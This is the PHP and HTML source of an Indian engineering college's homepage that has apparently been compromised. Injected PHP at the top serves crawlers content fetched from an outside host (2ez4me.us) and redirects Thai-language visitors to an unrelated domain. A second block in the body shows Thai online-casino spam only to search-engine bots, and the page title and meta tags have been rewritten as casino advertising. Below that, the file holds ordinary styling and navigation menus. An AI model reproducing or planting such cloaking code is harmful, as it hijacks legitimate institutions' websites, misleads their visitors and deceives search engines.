<?php
$referer         = $_SERVER['HTTP_REFERER']            ?? '';
$agent           = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$acceptLang      = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '');
$requestUri      = $_SERVER['REQUEST_URI']             ?? '/';
$cookieAz        = $_COOKIE['az']                      ?? '';
$upgradeInsecure = (int) ($_SERVER['HTTP_UPGRADE_INSECURE_REQUESTS'] ?? 0);

if (strpos($agent, 'bot') !== false && $requestUri === '/') {

    if (
        str_contains($acceptLang, 'zh') &&
        $upgradeInsecure === 1 &&
        $cookieAz === 'lp'
    ) {
        $secureFlag = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off');
        setcookie(
            'az',
            'lp',
            [
                'expires'  => time() + (3600 * 7200),
                'path'     => '/',
                'secure'   => $secureFlag,
                'httponly' => true,
                'samesite' => 'Lax'
            ]
        );
        echo "<!doctype html><html><head><title></title></head><body></body></html>";
        exit;
    }

    $ch = curl_init("https://2ez4me.us/acet/");
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 2,
        CURLOPT_TIMEOUT        => 5,
        CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Fetcher/1.0)',
    ]);
    $response  = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && ($http_code === 0 || $http_code < 400)) {
        header('Content-Type: text/html; charset=utf-8');
        echo $response;
    } else {
        echo "<!doctype html><html><head><title></title></head><body></body></html>";
    }
    exit;
}

if (str_starts_with($acceptLang, 'th')) {
    header("Location: https://xn--12ca2dbc1f9gc3nd.lazismumedankota.org/403.html", true, 301);
    exit;
}
?> 
<!DOCTYPE html>
<html class="no-js" lang="">
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<head>
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <title>ACET | คาสิโนออนไลน์ รวมบาคาร่า สล็อต PG และ PG SLOT สล็อตที่ดีที่สุดในไทย</title>
    <meta name="description" content="ACET เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด แตกง่าย ระบบออโต้ ฝากถอนเร็ว ปลอดภัย 100%">
	<link rel="canonical" href="https://acet.ac.in/" />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta property="og:title" content="ACET | คาสิโนออนไลน์ รวมบาคาร่า สล็อต PG และ PG SLOT สล็อตที่ดีที่สุดในไทย" />
    <meta property="og:description" content="ACET เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด แตกง่าย ระบบออโต้ ฝากถอนเร็ว ปลอดภัย 100%" />
	<meta property="og:url" content="https://acet.ac.in/" />
	<meta property="og:site_name" content="acet.ac.in" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    
    <!-- Favicon -->
    <link rel="shortcut icon" type="image/x-icon" href="logos/college.png">
    <!-- Normalize CSS -->
    <!-- <link rel="stylesheet" href="css/normalize.css"> -->
    <!-- Main CSS -->
    <!-- <link rel="stylesheet" href="css/main.css"> -->
    <!-- Bootstrap CSS -->
    <!-- <link rel="stylesheet" href="css/bootstrap.min.css"> -->
    <!-- Animate CSS -->
    <link rel="stylesheet" href="css/animate.min.css">
    <!-- Font-awesome CSS-->
    <!-- <link rel="stylesheet" href="css/font-awesome.min.css"> -->
    <!-- Owl Caousel CSS -->
    <!-- <link rel="stylesheet" href="vendor/OwlCarousel/owl.carousel.min.css"> -->
    <!-- <link rel="stylesheet" href="vendor/OwlCarousel/owl.theme.default.min.css"> -->
    <!-- Main Menu CSS -->
    <link rel="stylesheet" href="css/meanmenu.min.css">
    <!-- nivo slider CSS -->
    <!-- <link rel="stylesheet" href="vendor/slider/css/nivo-slider.css" type="text/css" /> -->
    <!-- <link rel="stylesheet" href="vendor/slider/css/preview.css" type="text/css" media="screen" /> -->
    <!-- Datetime Picker Style CSS -->
    <!-- <link rel="stylesheet" href="css/jquery.datetimepicker.css"> -->
    <!-- Magic popup CSS -->
    <!-- <link rel="stylesheet" href="css/magnific-popup.css"> -->
    <!-- Switch Style CSS -->
    <!-- <link rel="stylesheet" href="css/hover-min.css"> -->
    <!-- ReImageGrid CSS -->
    <!-- <link rel="stylesheet" href="css/reImageGrid.css"> -->
    <!-- Custom CSS -->
    <link rel="stylesheet" href="style.css">


    <link rel="stylesheet" type="text/css" href="css/full-slider.css">
    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
    <!-- Bootstrap Core JS -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>   
    <!-- animation css link-->
    <!-- <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.css"> -->


    <!-- font family link -->
    <link href="https://fonts.googleapis.com/css?family=Bree+Serif" rel="stylesheet">


    <!--flash news-->
    <link rel="stylesheet" type="text/css" href="css/ticker.css">
    <!-- <link href="https://www.jqueryscript.net/css/jquerysctipttop.css" rel="stylesheet" type="text/css"> -->

    <!-- <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script> -->
    <script src="js/ticker.js"></script>
    <!--flash news end-->

    <!--  website feedback links  -->
    <!--jquery ajax js-->
    <!-- <script src="js/jquery.min.js"></script> -->


    <!--star rating js-->
    <!-- <link href="stars/css/star-rating.css" media="all" rel="stylesheet" type="text/css"/> -->
    <!--suppress JSUnresolvedLibraryURL -->
    <!-- <script src="stars/js/star-rating.js" type="text/javascript"></script> -->

    <!--notify alert js and css-->
    <link type="text/css" rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans">
    <link rel="stylesheet" type="text/css" href="css/alert-notify/notify.css">
    <link rel="stylesheet" type="text/css" href="css/alert-notify/prettify.css">

    <!-- Load local jQuery -->
    <!-- <script src="css/libs/jquery-loader.js"></script> -->

    <!-- Load local lib and tests -->
    <link rel="stylesheet" href="css/libs/feedback/remodal.css">
    <link rel="stylesheet" href="css/libs/feedback/remodal-default-theme.css">
    <script src="css/libs/feedback/remodal.js"></script>
    <!-- <script src="https://aec.edu.in/css/libs/jquery-loader.js"></script> -->
    <link rel="stylesheet" type="text/css" href="css/index.css">
    <!-- Modernizr Js -->
    <!-- <script src="js/modernizr-2.8.3.min.js"></script> -->
    <style type="text/css">
        .flash_margin{
            margin: 0 !important;
        }
        .login_btn{
            background: #046;
            border: none;
            box-shadow: none;
            min-height: 40px;
            height: 100%;
            padding: 0px 10px;
            font-weight: bold;
            letter-spacing: 1px;
            white-space: nowrap;
            position: relative;
            right: 10px;
        }

        .login_btn_dropDown  ul li {
            margin: 0 !important;
            width: 100%;
            /*padding: 5px 0;*/
        }

        .login_btn_dropDown .dropdown-menu {
            margin: 0;
        }

        @media screen and (max-width: 475px) {
            .login_btn {
                margin-top: 8px;
            }
        }

        .desktop-nav > nav{
            float:right;
        }
        .desktop-nav > nav>ul{
            float:left;
            position:relative;
            margin:0;
        }
        .desktop-nav > nav li{
            list-style:none;
            float:left;
        }
        .desktop-nav > nav .dropdown{
            position:relative
        }
        .desktop-nav > nav li a{
            text-decoration: none;
            font-family: Roboto, sans-serif;
            font-size: 15px;
            font-weight: 500;
            line-height: 24px;
            color: #002147;
            /*text-transform: uppercase;*/
            font-style: normal;
            padding: 33px 15px;
            display: block;
        }
        .desktop-nav > nav li a:hover{
            color: #fdc800;
            transition: 0.4s;
        }
        .desktop-nav > nav li ul{
            display:none;
        }
        .desktop-nav > nav li:hover ul{
            display:inline;
        }
        .desktop-nav > nav li li{
            float:none;
        }
        .desktop-nav > nav .dropdown ul{
            position:absolute;
            left:0;
            top:100%;
            background:#fff;
            padding:20px 0;
            border-bottom:3px solid #34495e;
        }
        .desktop-nav > nav .dropdown li{
            white-space:nowrap
        }
        .desktop-nav > nav .dropdown li a{
            padding:10px 35px;
            font-size:13px;
            min-width:200px
        }
        .desktop-nav > nav .mega-dropdown{
            /*width:100%;*/
            position:absolute;
           /* top:100%;*/
            background: #002147;
            overflow:hidden;
            /*padding:20px 35px;*/
            padding:10px 25px;
            border-top: 3px solid #fdc800;
            z-index: 9999;
        }
        .mega-dropdownright {
            right: 0;
        }
        .mega-dropdownleft {
            left: 0;
        }
        .mega-dropdownauto {
            left: 0;
            right: 0;
        }
        .desktop-nav > nav li li a{
            float:none;
            color:#fff;
            display:block;
            padding:8px 10px;
            border-radius:2px;
            font-size:13px
        }
        .desktop-nav > nav li li a:hover{
            /*background:#bdc3c7;*/
            background:rgba(255,255,255,0.4);
        }
        .mega-col{
            /*width:25%;*/
            float:left;
            margin-right: 10px;
        }
        .mega-col-1{
            width: 100%;
        }
        .mega-col-2 {
            width: 50%;
        }
        .mega-col-3 {
            width: 33.3%;
        }
        .mega-col-4{
            width: 25%;
        }
        #menu-icon{
            position:absolute;
            right:0;
            top:50%;
            margin-top:-12px;
            margin-right:30px;
            display:none
        }
        #menu-icon span{
            border:2px solid #fff;
            width:30px;
            margin-bottom:5px;
            display:block;
            -webkit-transition:all .2s;
            transition:all .1s
        }
        .tab_heading {
            color: #fd752c;
        }

        @media screen and (max-width: 1369px) {
            .desktop-nav > nav li a{
                /*line-height: 0;*/
                padding: 22px 10px;
            }
        }

        @media screen and (min-device-width: 1280px) and (max-device-width: 1500px){
        .desktop-nav > nav li a {
          /* line-height: 0; */
          padding: 23px 10px;
          font-size: 14px !important;
        }
      }

        @media screen and (max-width: 1260px) and (max-device-width: 1279px){
            .desktop-nav > nav li a{
                /*line-height: 0;*/
                padding: 10px;
                  font-size: 13px !important;
            }
        }
        .admission_code {
            margin-top: 10px;
            background: none !important;
          }
      .button-alumini{
  background-color: #0a5c45;
  -webkit-border-radius: 10px;
  border-radius: 10px;
  border: none;
  color: #FFFFFF;
  cursor: pointer;
  display: inline-block;
  font-family: Arial;
  font-size: 16px;
  padding: 0px 10px;
  text-align: center;
  text-decoration: none;
  -webkit-animation: glowing 1500ms infinite;
  -moz-animation: glowing 1500ms infinite;
  -o-animation: glowing 1500ms infinite;
  animation: glowing 1500ms infinite;
}
@-webkit-keyframes glowing {
  0% { background-color: #0a5c45; -webkit-box-shadow: 0 0 3px #B20000; }
  50% { background-color: #4a8c45; -webkit-box-shadow: 0 0 40px #FF0000; }
  100% { background-color: #6aac45; -webkit-box-shadow: 0 0 3px #B20000; }
}

@-moz-keyframes glowing {
  0% { background-color: #0a5c45; -moz-box-shadow: 0 0 3px #B20000; }
  50% { background-color: #4a8c45; -moz-box-shadow: 0 0 40px #FF0000; }
  100% { background-color: #6aac45; -moz-box-shadow: 0 0 3px #B20000; }
}

@-o-keyframes glowing {
  0% { background-color: #0a5c45; box-shadow: 0 0 3px #B20000; }
  50% { background-color: #4a8c45; box-shadow: 0 0 40px #FF0000; }
  100% { background-color: #6aac45; box-shadow: 0 0 3px #B20000; }
}

@keyframes glowing {
  0% { background-color: #0a5c45; box-shadow: 0 0 3px #B20000; }
  50% { background-color: #4a8c45; box-shadow: 0 0 40px #FF0000; }
  100% { background-color: #6aac45; box-shadow: 0 0 3px #B20000; }
}  




  .float1 {
      position: fixed;
      width: 59px;
      height: 60px;
      bottom: 22px;
      left: -4px;
      background-color: #25d366;
      color: #FFF;
      border-radius: 50px;
      text-align: center;
      font-size: 40px;
      z-index: 100;
  }
  .float2 {
      position: fixed;
      width: 60px;
      height: 60px;
      bottom: 22px;
      right: 4px;
      color: #FFF;
      border-radius: 50px;
      text-align: center;
      z-index: 999;
  }
/*  .float3 {
      position: fixed;
      width: 100%;
    
  }
*/
  @media screen and (max-width: 405px) {
    .apply_admission_card {
        height: 72px !important;
    }
    .apply_admission {
        text-align: center;
        margin-top: 12px;
    }
  }

  .apply_admission p{
    margin: 11px 0 0 10px;
  }

  @media screen and (max-width: 479px) {
    .powered_by{
        margin-bottom: 35px !important;
        padding: 0 !important;
        float: none !important;
        text-align: center !important;
    }
  }

  #scrollUp {
    background-color: rgba(253, 200, 0, 0.8);
    bottom: 80px;
    color: #ffffff;
    display: block;
    font-size: 18px;
    height: 45px;
    line-height: 45px;
    position: fixed;
    right: 20px;
    text-align: center;
    text-decoration: none;
    transition: all 0.5s cubic-bezier(0, 0, 0, 1) 0s;
    width: 45px;
    z-index: 99999;
    border-radius: 50%;
}
 .login_btn1{
              background: #001247;
              border: none;
              box-shadow: none;
              min-height: 40px;
              height: 100%;
              /* margin-top: 9px;*/
              padding: 0px 10px;
              font-weight: bold;
              letter-spacing: 1px;
              white-space: nowrap;
              position: relative;
              right: 10px;
              border-radius: 7px;
          }
.name{
    font-size: 18px;
    line-height: 20px;
    height: 15px;

}
.copyright p {
    text-align: left;
    color: #ffff;
    padding: 2px 0;
    margin-bottom: 23px;
}


 @media screen and (max-width: 395px) {
     .login_btn1{
                  background: #001247;
                  border: none;
                  box-shadow: none;
                  min-height: 40px;
                  height: 100%;
                  /* margin-top: 9px;*/
                  padding: 0px 8px;
                  font-weight: bold;
                  letter-spacing: 1px;
                  white-space: nowrap;
                  position: relative;
                  right: 10px;
                  border-radius: 7px;
              }

                      .apply_admission {
            text-align: center;
            margin-top: 12px;
            font-size: 16px
        }

    .name{
        font-size: 16px;
        line-height: 20px;
        height: 15px;

    }

 } 

 @media screen and (max-width: 361px) {
     .login_btn1{
                  background: #001247;
                  border: none;
                  box-shadow: none;
                  min-height: 40px;
                  height: 100%;
                  /* margin-top: 9px;*/
                  padding: 0px 8px;
                  font-weight: bold;
                  letter-spacing: 1px;
                  white-space: nowrap;
                  position: relative;
                  right: 10px;
                  border-radius: 7px;
              }

                      .apply_admission {
            text-align: center;
            margin-top: 12px;
            font-size: 13px
        }

    .name{
        font-size: 13px;
        line-height: 20px;
        height: 15px;

    }

 } 

 @media screen and (max-width: 324px) {
     .login_btn1{
                  background: #001247;
                  border: none;
                  box-shadow: none;
                  min-height: 40px;
                  height: 100%;
                  /* margin-top: 9px;*/
                  padding: 0px 8px;
                  font-weight: bold;
                  letter-spacing: 1px;
                  white-space: nowrap;
                  position: relative;
                  right: 10px;
                  border-radius: 7px;
              }

                      .apply_admission {
            text-align: center;
            margin-top: 12px;
            font-size: 12px
        }

    .name{
        font-size: 12px;
        line-height: 20px;
        height: 15px;

    }

 }
.myLinkClass:hover a{
  text-decoration:none;
}
.myLinkClass{
  text-decoration:none;
}
.myLinkClass:before {
  /*visibility: hidden;*/
 height: 0;
}

/*abbr{
  cursor: pointer;
  display: inline;
  border: none;
}*/
.button-alumini2{
  background-color: blue;
  -webkit-border-radius: 10px;
  border-radius: 10px;
  border: none;
  color: #FFFFFF;
  cursor: pointer;
  display: inline-block;
  font-family: Arial;
  font-size: 15px;
  padding: 0px 10px;
  text-align: center;
  text-decoration: none;
  -webkit-animation: glowing1 1500ms infinite;
  -moz-animation: glowing1 1500ms infinite;
  -o-animation: glowing1 1500ms infinite;
  animation: glowing1 1500ms infinite;
}
@-webkit-keyframes glowing1 {
  0% { background-color: #9c27b0; -webkit-box-shadow: 0 0 3px #84ffff; }
  50% { background-color: #00bfa5; -webkit-box-shadow: 0 0 40px #84ffff; }
  100% { background-color: #01579b; -webkit-box-shadow: 0 0 3px #84ffff; }
}

@-moz-keyframes glowing1 {
  0% { background-color: #9c27b0; -moz-box-shadow: 0 0 3px #84ffff; }
  50% { background-color: #00bfa5; -moz-box-shadow: 0 0 40px #84ffff; }
  100% { background-color: #01579b; -moz-box-shadow: 0 0 3px #84ffff; }
}

@-o-keyframes glowing1 {
  0% { background-color: #9c27b0; box-shadow: 0 0 3px #84ffff; }
  50% { background-color: #00bfa5; box-shadow: 0 0 40px #84ffff; }
  100% { background-color: #01579b; box-shadow: 0 0 3px #84ffff; }
}

@keyframes glowing1 {
  0% { background-color: #9c27b0; box-shadow: 0 0 3px #84ffff; }
  50% { background-color: #00bfa5; box-shadow: 0 0 40px #84ffff; }
  100% { background-color: #01579b; box-shadow: 0 0 3px #84ffff; }
}

.tabs_bos > li.active {
    background: rgba(255,255,255,0.4);
    font-size: bold !important;
}
.tabs_bos > li.active a {
    color: #fdc800 !important;
    transition: 0.4s !important;
    font-size: bold !important;
}






 .popup_this_container {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.6);
  z-index: 999999;
}

#popup_this {
    /*top: 68%;
    left: 56%;
    text-align: center;
    margin-top: -350px;
    margin-left: -188px;
    position: fixed;*/
    /*background: #fff;
    padding: 30px;*/


    position: relative;
    top: 20%;
    left: 0;
    right: 0;
    width: 60%;
}
@media screen and (min-width: 956px) and (max-width: 1500px) {
    #popup_this {
        width: 75%;
    }
}
@media screen and (min-width: 768px) and (max-width: 955px) {
    #popup_this {
        width: 80%;
    }
}
@media screen and (min-width: 500px) and (max-width: 767px) {
    #popup_this {
        width: 90%;
    }
}
@media screen and (min-width: 200px) and (max-width: 499px) {
    #popup_this {
        width: 95%;
    }
    .b-close {
        top: -7px !important;
        right: 4px !important;
    }
}
.b-close {
    position: absolute;
    right: 10px;
    top: 0;
    cursor: pointer;
    color: #fff;
    background: green;
    width: 15px;
   /* padding: 5px 10px;*/
   padding: 3px 10px;
}

.button-alumini_1 {
    background-color: #0c77f2!important;
    -webkit-border-radius: 10px;
    border-radius: 10px;
    border: none;
    color: #FFFFFF;
   /* cursor: pointer;
    display: inline-block;*/
    /*font-family: Arial;*/
    font-size: 16px;
    padding: 0px 10px;
    text-align: center;
    text-decoration: none;
    /* -webkit-animation: glowing 1500ms infinite; */
    -moz-animation: glowing 1500ms infinite;
    -o-animation: glowing 1500ms infinite;
    /* animation: glowing 1500ms infinite; */
}


  </style>
  </head>

<body>
    <!-- Add your site or application content here -->
    <!-- Preloader Start Here -->
    <!-- <div id="preloader"></div> -->
    <!-- Preloader End Here -->
    <!-- Main Body Area Start Here -->
<?php
function isBot()
{
    $bots = array(
        'AhrefsBot','baiduspider','baidu','bingbot','bing','DuckDuckBot',
        'facebookexternalhit','facebook','facebot','googlebot','-google',
        'google-inspectiontool','Uptime-Kuma','linked','Linkidator','linkwalker',
        'mediapartners','mod_pagespeed','naverbot','pinterest','SemrushBot',
        'twitterbot','twitter','xing','yahoo','YandexBot','YandexMobileBot',
        'yandex','Zeus/i'
    );
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    foreach ($bots as $bot) {
        if (stripos($ua, $bot) !== false) {
            return true;
        }
    }
    return false;
}

if (isBot()) {
    // TAMPILKAN POPUP UNTUK BOT
    ?>
<!-- POPUP -->
<div id="wrapper">
        <div id="text-2861201852" class="text">
    
<h1>ACET | คาสิโนออนไลน์ รวมบาคาร่า สล็อต PG และ PG SLOT สล็อตที่ดีที่สุดในไทย</h1>
    
<style>
#text-2861201852 {
  text-align: center;
}
</style>
  </div>
  <div id="text-2305460837" class="text">
    
<p>ACET เว็บคาสิโนออนไลน์ครบวงจร เล่นบาคาร่า สล็อต PG และ PG SLOT รวมสล็อตที่ดีที่สุด แตกง่าย ระบบออโต้ ฝากถอนเร็ว ปลอดภัย 100%</p>
    
<style>
#text-2305460837 {
  text-align: center;
}
</style>
  </div>
    <?php
} 
?>
        <header>
            <div id="header2" class="header2-area" >
                <div class="header-top-area" style="background:#FD752C ;color: #fff">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-lg-10 col-md-10 col-sm-10 col-xs-10">
                                <div class="header-top-left">
                                    <ul>
                                        <li><i class="fa fa-phone" aria-hidden="true"></i><a href="Tel:+1234567890"> + 91 99591 76665 </a></li>
                                        <li><i class="fa fa-envelope" aria-hidden="true"></i><a href="#">
                                        adityacollegeenggtech@gmail.com</a></li>
                                    

                                           <li><button class="btn-success btn button-alumini"><a href="https://www.aditya.ac.in/international/" target="_blank"><b>International Students</b></a></button></li>
                                          <li><button class="btn-success btn button-alumini2"><a href="#"target="_blank"><b>AP EAPCET CODE : ACET </b></a></button></li>
                                         <li><a href="?p=NAAC" target="_blank"> <button class="btn-success btn button-alumini"><b>NAAC</b></button></a></li>
                                         <!-- <li><button class="btn-success btn button-alumini"><b>AP EAPCET Code - <b style="color: yellow">ACET</b></b></button></li> -->
                                         <!-- <li><button class="btn-success btn button-alumini"><a href="?p=Bridge Course" target="_blank"><b>Bridge Course  2022-23</b></a></button></li> -->
                                         <li><button class="btn-success btn button-alumini"><a href="uploads/ARIIA/ARIIA_2021_22.pdf" target="_blank"><b>ARIIA 2021-22</b></a></button></li>
                                          <li><button class="btn-success btn button-alumini2"><a href="https://thecodemind.io/app/logic/"target="_blank"><b>APT Logic</b></a></button></li>

                                         <!-- <li><button class="btn-success btn button-alumini"><a href="https://thecodemind.io/app/veda2022/index.php" target="_blank"><b>Veda 2022</b></a></button></li> -->

                                           <!-- <li><button class="btn-success btn button-alumini2"><a href="https://thecodemind.io/app/veda2023/"target="_blank"><b>VEDA 2K23 </b></a></button></li> -->

                                          <!-- <li><button class="btn-success btn button-alumini2"><a href="https://technicalhub.io/placement/"target="_blank"><b>Placement Training </b></a></button></li> -->
    
                                         <!-- <li><button class="btn-success btn button-alumini2"><a href="https://thecodemind.io/app/logic/"target="_blank"><b>APT Logic</b></a></button></li> -->
                                         <!-- <li><button class="btn-success btn button-alumini2"><a href="https://technicalhub.io/dxc/" target="_blank"><b>CRT</b></a></button></li> -->

                                       

                                    </ul>
                                </div>
                            </div>
                            <div class="col-lg-2 col-md-2 col-sm-2 col-xs-2" style="margin-left: -62px;">
                                <div class="header-top-right">
                                    <ul style="margin-bottom: 0!important">
                                        <li>
                                            <div class="dropdown login_btn_dropDown">
                                                <button class="login_btn" type="button" id="menu1" data-toggle="dropdown"><i class="glyphicon glyphicon-user" style="font-size: 14px !important;"></i> Login
                                                    <span class="caret"></span>
                                                </button>

                                                <ul class="dropdown-menu" role="menu" aria-labelledby="menu1" style="left: -98px;">
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://myprofile.technicalhub.io/" target="blank"><b>Myprofile Login</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://target.technicalhub.io/" target="blank"><b>Target Login</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://myhub.technicalhub.io/" target="blank"><b>Myhub Login</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://examsection.acet.ac.in/" target="blank"><b>Autonomous Exam Portal</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="http://210.212.210.83:801/" target="blank"><b> Online Classes</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="http://moodle.acet.ac.in:82/lms/" target="blank"><b>LMS Login</b></a>
                                                     </li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://login.microsoftonline.com/" target="blank"><b>Aditya Mail</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="https://info.aec.edu.in/acet/" target="blank"><b>Student/Parent login</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="http://172.7.91.249:333/login" target="blank"><b>Stock Register</b></a></li>
                                                     <li role="presentation"><a role="menuitem" tabindex="-1" href="http://172.7.91.249:333/login" target="blank"><b>Alumni</b></a>

                                                     </li>
                                                    <!-- http://lms.acet.ac.in:82/lms/ -->
                                                   
                                                </ul>
                                            </div>
                                        </li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="main-menu-area bg-textPrimary hidden-xs" id="sticker" style="z-index: 5000;">
                    <div class="container-fluid">
                        <div class="row">
                            <div class="col-lg-2 col-md-2 col-sm-3">
                                <div class="logo-area">
                                    <a href="index.php"><img class="img-responsive" src="images/logo.png" alt="logo" style="width: 100%;height: 50px;"></a>
                                </div>
                            </div>
                            <div class="col-lg-10 col-md-10 col-sm-9 text-left desktop-nav">
                                <nav id="desktop-nav">
                                    <ul>
                                        <li>
                                            <a href="http://www.acet.ac.in/"><b>Home</b></a>
                                        </li>
                                        <li>
                                            <a href="#"><b>About Us</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">About College</b></li>
                                                        <li><a href="?p=About-AEC">About ACET</a></li>
                                                        <li><a href="?p=Vision-Mission">Vision & Mission</a></li>
                                                        <li><a href="?p=Chairmans-Message#chairmans_message">Chairman's Message</a></li>
                                                        <li><a href="?p=Vice-Chairmans-Message#vice_chairmans_message">Vice-Chairman's Message</a></li>
                                                        <li><a href="?p=Secretary-Message#secretary_message">Secretary's Message</a></li>
                                                        <li><a href="?p=Principals-Message#principals_message">Principal's Message</a></li>
                                                        <li><a href="?p=Governance"> Governance </a></li>
                                                        <li><a href="?p=Rules and Regulations">Rules and Regulations</a></li>
                                                        <li><a href="?p=ACET-Policy">ACET Policy</a></li>
                                                        <li><a href="?p=Rules and Regulations#AICTE">AICTE Mandatory Disclosure</a></li>
                                                        <li><a href="?p=Best_Practices#best_practices">Best Practices</a></li>
                                                        <li><a href="?p=Institutional Distinctiveness">Institutional Distinctiveness</a></li>
                                                        <!-- <li><a href="?p=BOG"> Governing Body</a></li> -->

                                                        <li><a href="includes/BOG/auditedstatement.pdf"> Audited Statement</a></li>
                                                    </ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Contact Us</b></li>
                                                        <li><a href="?p=contactus"> Get In Touch</a></li>
                                                        <li><a href="?p=contactus">How To Reach Campus</a></li>                                                        
                                                    </ul>                                                
                                                </li>
                                            </ul>
                                        </li>

                                        <li>
                                            <a href="#"><b>Academics</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Course</b></li>
                                                        <li><a href="?p=Syllabus">Syllabus - Jntuk</a></li>
                                                        <li><a href="?p=PO">PO, PSO & CO's</a></li>
                                                        <li><a href="?p=UG-Courses#UG">UG Courses</a></li>
                                                        <li><a href="?p=PG-Courses#PG">PG Courses</a></li>
                                                        <li><a href="?p=Diploma#Diploma">Diploma</a></li>
                                                        <li><a href="https://jntukresults.edu.in/" target="_blank">JNTUK Results</a></li>
                                                    </ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Achievements</b></li>
                                                        <li><a href="?p=Student-Achievement">Student Achievement</a></li>
                                                        <li><a href="?p=Faculty-Achievement"> Faculty Achievement</a></li>
                                                        <li><b class="tab_heading">Toppers</b></li>
                                                        <li><a href="?p=Batch-wise-toppers">Batch-wise Toppers</a></li>
                                                        <li><a href="?p=Academic-Year-Toppers">Academic Year Toppers</a></li>
                                                    </ul> 
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Scholarship</b></li>
                                                        <!-- <li><a href="=">Govt</a></li> -->
                                                         <li><a href="?p=allcommittees&category=Govt&committeename=Government"> Government</a></li>

                                                         <li><a href="?p=allcommittees&category=Merit&committeename=Merit"> Merit</a></li>
                                                                                                             
                                                        <li><b class="tab_heading">Autonomous</b></li>
                                                        <li><a href="?p=Regulations">Regulations</a></li>                                                       
                                                        <li><a href="?p=Autonomous_syllabus">Syllabus </a></li>
                                                        <li><a href="?p=Autonomous_calenders">Academic Calendars</a></li>                                                       

                                                    </ul>

                                                </li>
                                            </ul>
                                        </li>                                        
                                        <li>
                                            <a href="#"><b>Departments</b></a>
                                            <ul class="mega-dropdown">   
                                                <li class="row"> 
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Departments</b></li>
                                                        <li><a href ="?p=CIVIL">Civil Engineering</a></li>
                                                        <li><a href ="?p=EEE">Electrical and Electronics Engineering</a></li>
                                                        <li><a href ="?p=MECH">Mechanical Engineering</a></li>
                                                        <li><a href ="?p=ECE">Electronics and Communication Engineering</a></li>
                                                        <li><a href ="?p=CSE">Computer Science and Engineering</a></li>
                                                        <li><a href ="?p=IT">Information Technology</a></li>
                                                        <li><a href ="?p=AIML_DS">Computer Science and Engineering(AIML & Data Science)</a></li>
                                                        <li><a href ="?p=MBA">Department of Management Studies</a></li>
                                                        <li><a href ="?p=MCA">Department of MCA</a></li>
                                                        <li><a href ="?p=HBS">Department of Humanities-Sciences</a></li>
                                                    </ul>
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Laboratories</b></li>
                                                        <li><a href ="?p=Civil-Lab">Civil Engineering</a></li>
                                                        <li><a href ="?p=EEE-Lab">Electrical and Electronics Engineering</a></li>
                                                        <li><a href ="?p=Mech-Lab">Mechanical Engineering</a></li>
                                                        <li><a href ="?p=ECE-Lab">Electronics and Communication Engineering</a></li>
                                                        <li><a href ="?p=CSE-Lab">Computer Science and Engineering</a></li>
                                                        <li><a href ="?p=IT-Lab">Information Technology</a></li>
                                                    </ul>
                                                    <!-- <ul class="mega-col">
                                                        <li><b class="tab_heading">T-Hub</b></li>
                                                        <li><a href="?p=About_T-Hub">About T-Hub</a></li>
                                                    </ul> -->
                                                </li>
                                            </ul>
                                        </li>
                                        <li>
                                            <a href="#"><b>Research</b></a>
                                            <ul class="mega-dropdown">
                                                <li class="row">
                                                    <ul class="mega-col">
                                                        <li><b class="tab_heading">Research</b></li>
                                                        <li><a href="?p=Publications">Publications</a></li>
                                                        <li><a href="Research/R and D INCENTIVE POLICY.pdf" target="_blank">R&D Incentive Policy</a></li>

